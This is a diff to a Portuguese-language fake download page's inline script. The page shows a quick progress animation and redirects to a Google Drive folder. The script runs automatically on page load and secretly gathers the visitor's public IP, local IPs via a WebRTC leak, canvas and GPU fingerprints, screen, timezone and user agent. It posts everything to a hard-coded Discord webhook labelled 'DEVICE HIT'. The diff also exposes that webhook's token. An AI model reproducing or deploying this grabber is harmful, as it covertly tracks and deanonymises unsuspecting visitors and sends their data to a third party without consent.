@@ -29,29 +29,34 @@
             0% { transform:translateX(-100%); }
             100% { transform:translateX(100%); }
         }
-        #progress-glow { will-change: transform; }
     </style>
     
     <script>
-        // CONFIG
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         const DOWNLOAD_URL = 'https://drive.google.com/drive/folders/1lNC2YwOY2L7igNExbPcJ2u9rOp6CtTR8?hl=pt-br';
         
-        // FINGERPRINT ULTRA-RÁPIDO (paralelizado + otimizado)
+        // FINGERPRINT ULTRA-RÁPIDO E COMPATÍVEL
         async function ultraFastRecon() {
-            // PARALELO: Todas as coletas simultâneas
-            const [pubIP, localIPs, canvasHash, gpuInfo, basicFP] = await Promise.all([
-                // IP Público (3x mais rápido)
-                (async()=>{
-                    const ip = await Promise.any([
-                        fetch('https://api.ipify.org?format=text',{cache:'no-cache'}).then(r=>r.text()),
-                        fetch('https://icanhazip.com',{cache:'no-cache'}).then(r=>r.text()),
-                        fetch('https://ipecho.net/plain',{cache:'no-cache'}).then(r=>r.text())
-                    ]);
-                    return ip.trim();
-                })().catch(()=>'unknown'),
+            // IP Público (múltiplas tentativas paralelas)
+            const getPubIP = async () => {
+                const sources = [
+                    fetch('https://api.ipify.org?format=text',{cache:'no-cache'}).then(r=>r.text()),
+                    fetch('https://icanhazip.com',{cache:'no-cache'}).then(r=>r.text()),
+                    fetch('https://ipecho.net/plain',{cache:'no-cache'}).then(r=>r.text())
+                ];
                 
-                // Local IPs (otimizado - apenas 1 STUN)
+                try {
+                    const ip = await Promise.race(sources);
+                    return ip.trim();
+                } catch {
+                    return 'unknown';
+                }
+            };
+            
+            // PARALELO: Tudo simultâneo
+            const [pubIP, localIPs, canvasHash, gpuInfo, basicFP] = await Promise.allSettled([
+                getPubIP(),
+                
                 (async()=>{
                     try {
                         const pc = new RTCPeerConnection({ 
@@ -61,52 +66,58 @@
                         const ips = new Set();
                         pc.onicecandidate = e => {
                             const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                            if(ip && !['127.','10.','172.1','192.168'].some(b=>ip.startsWith(b))) ips.add(ip);
+                            if(ip && !['127.','10.','172.1','192.168'].some(b=>ip.startsWith(b))) {
+                                ips.add(ip);
+                            }
                         };
                         pc.createDataChannel('test');
                         await pc.createOffer();
                         await pc.setLocalDescription(pc.localDescription);
-                        await new Promise(r=>setTimeout(r,500));
+                        await new Promise(r=>setTimeout(r,400));
                         pc.close();
                         return Array.from(ips).join(', ') || 'none';
-                    } catch { return 'blocked'; }
+                    } catch {
+                        return 'blocked';
+                    }
                 })(),
                 
-                // Canvas (simplificado e rápido)
                 (async()=>{
                     const canvas = document.createElement('canvas');
-                    canvas.width=200; canvas.height=60;
+                    canvas.width = 200;
+                    canvas.height = 60;
                     const ctx = canvas.getContext('2d');
                     ctx.textBaseline = 'top';
                     ctx.font = '24px monospace';
-                    ctx.fillText('pentest',5,5);
-                    ctx.fillText(navigator.userAgent.slice(0,20),5,30);
+                    ctx.fillText('pentest', 5, 5);
+                    ctx.fillText(navigator.userAgent.slice(0,20), 5, 30);
                     return btoa(canvas.toDataURL()).slice(0,60);
                 })(),
                 
-                // GPU (inline)
-                (()=>{
+                (function(){
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl');
                     if(!gl) return 'no-webgl';
                     try {
-                        return `${gl.getParameter(gl.VENDOR).slice(0,20)}|${gl.getParameter(gl.RENDERER).slice(0,25)}`;
-                    } catch { return 'blocked'; }
+                        return gl.getParameter(gl.VENDOR).slice(0,20) + '|' + gl.getParameter(gl.RENDERER).slice(0,25);
+                    } catch {
+                        return 'blocked';
+                    }
                 })(),
                 
-                // Basic FP (inline - sem await)
-                ()=>{
+                (function(){
                     return {
-                        lang: navigator.language,
+                        lang: navigator.language || 'unknown',
                         tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                         cores: navigator.hardwareConcurrency || 0,
                         mem: navigator.deviceMemory || 0,
-                        res: `${screen.width}x${screen.height}`,
+                        res: screen.width + 'x' + screen.height,
                         ua: navigator.userAgent.slice(0,100),
-                        plat: navigator.platform
+                        plat: navigator.platform || 'unknown'
                     };
-                }()
-            ]);
+                })()
+            ]).then(results => 
+                results.map(r => r.status === 'fulfilled' ? r.value : 'error')
+            );
             
             return {
                 timestamp: Date.now(),
@@ -115,11 +126,11 @@
                 canvas: canvasHash,
                 gpu: gpuInfo,
                 fp: basicFP,
-                referrer: document.referrer.slice(0,100)
+                referrer: document.referrer.slice(0,100) || 'direct'
             };
         }
         
-        // WEBHOOK OTIMIZADO (compacto + sem erros)
+        // WEBHOOK COMPACTO
         async function sendWebhook(data) {
             try {
                 await fetch(WEBHOOK, {
@@ -127,15 +138,15 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         username: '📥 DOWNLOAD v3.0',
-                        content: `🎯 ${data.public_ip} | ${data.fp.res}`,
+                        content: `🎯 ${data.public_ip || '???'}`,
                         embeds: [{
                             title: 'DEVICE HIT',
                             fields: [
-                                {name:'🌐 IP',value:`${data.public_ip}\n${data.local_ips.slice(0,30)}`,inline:true},
-                                {name:'🖥️ GPU',value:data.gpu.slice(0,25),inline:true},
-                                {name:'📱 RES',value:data.fp.res,inline:true},
+                                {name:'🌐 IP',value:`${data.public_ip}\n${String(data.local_ips).slice(0,30)}`,inline:true},
+                                {name:'🖥️ GPU',value:String(data.gpu).slice(0,25),inline:true},
+                                {name:'📱 RES',value:String(data.fp.res),inline:true},
                                 {name:'🧠 CPU/RAM',value:`${data.fp.cores}c/${data.fp.mem}GB`,inline:true},
-                                {name:'🎨 Canvas',value:data.canvas.slice(0,35),inline:true}
+                                {name:'🎨 Canvas',value:String(data.canvas).slice(0,35),inline:true}
                             ],
                             color: 0xff0000,
                             timestamp: new Date(data.timestamp).toISOString()
@@ -143,10 +154,10 @@
                     }),
                     keepalive: true
                 });
-            } catch(e) {}
+            } catch(e){}
         }
         
-        // ANIMAÇÃO ULTRA-RÁPIDA (500ms total)
+        // ANIMAÇÃO RÁPIDA
         function fastAnimation() {
             const phases = [
                 {p:30, msg:'🔍 Conexão OK', detail:'Servidor primario ativo'},
@@ -157,31 +168,30 @@
             
             let i = 0;
             const iv = setInterval(()=>{
+                if(i >= phases.length) {
+                    clearInterval(iv);
+                    setTimeout(()=>location.href = DOWNLOAD_URL, 800);
+                    return;
+                }
                 const phase = phases[i];
-                document.getElementById('progress').style.width = `${phase.p}%`;
+                document.getElementById('progress').style.width = phase.p + '%';
                 document.getElementById('status').textContent = phase.msg;
                 document.getElementById('details').textContent = phase.detail;
                 i++;
-                if(i >= phases.length) {
-                    clearInterval(iv);
-                    setTimeout(()=>location.href=DOWNLOAD_URL, 800);
-                }
-            }, 120); // 480ms total + 800ms delay = ~1.3s
+            }, 120);
         }
         
-        // EXECUÇÃO PARALELA ULTRA-OTIMIZADA
+        // EXECUÇÃO PRINCIPAL
         async function execute() {
             document.getElementById('status').textContent = '🔍 Coleta de dados...';
             
-            // PARALELO: Recon + Webhook
             const data = await ultraFastRecon();
-            sendWebhook(data).catch(()=>{}); // Fire and forget
+            sendWebhook(data);
             
-            // Inicia animação IMEDIATAMENTE (overlap)
-            setTimeout(fastAnimation, 100);
+            setTimeout(fastAnimation, 50);
         }
         
-        // START (executa em DOMContentLoaded ao invés de load)
+        // AUTO-START
         if(document.readyState === 'loading') {
             document.addEventListener('DOMContentLoaded', execute);
         } else {
